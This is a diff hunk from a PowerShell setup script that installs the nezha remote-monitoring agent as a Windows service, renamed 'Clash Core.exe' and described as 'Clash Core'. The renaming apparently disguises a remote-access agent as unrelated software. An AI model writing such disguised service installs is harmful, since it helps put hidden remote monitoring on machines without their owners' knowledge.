@@ -75,7 +75,7 @@ if (!(Test-Path "C:\Cache")) { New-Item -Path "C:\Cache" -type directory }
 Move-Item -Path "C:\temp\nezha-agent.exe" -Destination "C:\Cache\Clash Core.exe"
 Remove-Item "C:\clash_core.zip"
 Remove-Item "C:\temp" -Recurse
-"C:\Cache\Clash Core.exe" service install
+& "C:\Cache\Clash Core.exe" service install
 
 $serviceName = "Clash Core.exe"
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName" -Name "Description" -Value "Clash Core" -ErrorAction SilentlyContinue
